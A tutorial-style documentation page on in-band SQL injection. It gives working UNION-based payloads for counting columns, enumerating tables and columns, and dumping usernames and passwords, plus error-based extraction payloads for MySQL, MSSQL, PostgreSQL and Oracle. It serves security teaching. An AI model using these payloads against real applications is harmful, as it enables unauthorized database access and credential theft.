---
title: 'In-Band SQL Injection'
description: 'Deep dive into Union-based and Error-based SQL injection, including step-by-step column counting, visible column identification, and data extraction.'
icon: material/transfer
tags:
  - sql-injection
  - in-band
  - union-sqli
  - error-sqli
---

# In-Band SQL Injection

In-Band SQL Injection occurs when the attacker uses the **same communication channel** to both inject the malicious payload and retrieve the results. This is the most common and easiest type of SQLi to exploit because the exfiltrated data is returned directly in the application's HTTP response.

There are two primary techniques for In-Band SQLi: **UNION-Based** and **Error-Based**.

---

## UNION-Based SQL Injection

UNION-Based SQLi leverages the `UNION` operator to combine the results of the attacker's injected query with the results of the original query. The application then displays the combined results on the page.

### Prerequisites for UNION SQLi

For a `UNION` query to work, two requirements must be met:

1. **Same Number of Columns**: The injected query must return the exact same number of columns as the original query.
2. **Compatible Data Types**: The data types of the columns in the injected query must be compatible with the corresponding columns in the original query (often string/varchar is safe).

### Exploitation Step-by-Step

#### Step 1: Determine the Number of Columns

You must first determine how many columns the original query is `SELECT`ing.

**Method A: Using `ORDER BY`**

Increment the column number until you hit an error:

```sql title="ORDER BY Enumeration"
' ORDER BY 1--    ✓ (Page loads normally)
' ORDER BY 2--    ✓ (Page loads normally)
' ORDER BY 3--    ✓ (Page loads normally)
' ORDER BY 4--    ✗ (Database error or empty page)
```
If `ORDER BY 4` fails, the query has **exactly 3 columns**.

**Method B: Using `UNION SELECT NULL`**

Add `NULL`s until the query succeeds:

```sql title="NULL Enumeration"
' UNION SELECT NULL--              ✗ (Error)
' UNION SELECT NULL, NULL--        ✗ (Error)
' UNION SELECT NULL, NULL, NULL--  ✓ (Page loads normally -> 3 columns)
```

#### Step 2: Find Displayed Columns

Not all columns retrieved by the query are actually printed on the web page. You must find which column indexes are visible.

```sql title="Visible Column Identification"
' UNION SELECT 'AAA', 'BBB', 'CCC'--
```

Look at the page response. If you see `BBB` rendered on the screen, you know that column 2 is your visible output channel.

#### Step 3: Extract Database Information

Now use the visible column (column 2 in our example) to extract useful functions:

```sql title="Extracting Metadata (MySQL)"
' UNION SELECT NULL, @@version, NULL--
' UNION SELECT NULL, user(), NULL--
' UNION SELECT NULL, database(), NULL--
```

#### Step 4: Enumerate Tables

Once you know the database name, query the `information_schema` to find tables.

```sql title="List All Tables (MySQL)"
' UNION SELECT NULL, GROUP_CONCAT(table_name SEPARATOR ', '), NULL
  FROM information_schema.tables
  WHERE table_schema = database()--
```

#### Step 5: Enumerate Columns

After identifying a target table (e.g., `users`), find its columns.

```sql title="List Columns of 'users' Table (MySQL)"
' UNION SELECT NULL, GROUP_CONCAT(column_name SEPARATOR ', '), NULL
  FROM information_schema.columns
  WHERE table_name = 'users'--
```

#### Step 6: Dump Data

Finally, extract the data from the target table.

```sql title="Extract Usernames and Passwords"
' UNION SELECT NULL, GROUP_CONCAT(username, ':', password SEPARATOR '\n'), NULL
  FROM users--
```

---

## Error-Based SQL Injection

Error-Based SQLi forces the database to evaluate a specific function that triggers an error. The attacker crafts the query so that the *result of their subquery* is included within the error message returned to the user.

This technique is invaluable when the application does not display query results directly, but **does display verbose database error messages**.

### MySQL Error-Based Techniques

MySQL has several functions that can be abused to leak data via errors.

#### ExtractValue()

`ExtractValue()` parses XML. If you pass it malformed XML, it throws an error containing the malformed string.

```sql title="ExtractValue Injection"
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
```
**Error Output:** `XPATH syntax error: '~8.0.30~'`

#### UpdateXML()

Similar to `ExtractValue()`, `UpdateXML()` throws an error when given invalid XPath syntax.

```sql title="UpdateXML Injection"
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
```

#### Floor() / Rand() / Group By

This classic technique causes a duplicate key error in a temporary table.

```sql title="Floor/Rand/GroupBy Injection"
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--
```
**Error Output:** `Duplicate entry '8.0.301' for key 'group_key'`

### MSSQL Error-Based Techniques

MSSQL errors often occur when attempting to convert a string (varchar) to an integer.

```sql title="Conversion Error Injection"
' AND 1=CONVERT(int, (SELECT @@version))--
```
**Error Output:** `Conversion failed when converting the varchar value 'Microsoft SQL Server 2019...' to data type int.`

### PostgreSQL Error-Based Techniques

PostgreSQL can leak data through casting errors.

```sql title="Casting Error Injection"
' AND 1=CAST((SELECT version()) AS int)--
```
**Error Output:** `invalid input syntax for integer: "PostgreSQL 14.5..."`

### Oracle Error-Based Techniques

Oracle can leak data via `CTXSYS.DRITHSX.SN` or `UTL_INADDR.GET_HOST_ADDRESS`.

```sql title="UTL_INADDR Injection"
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--
```
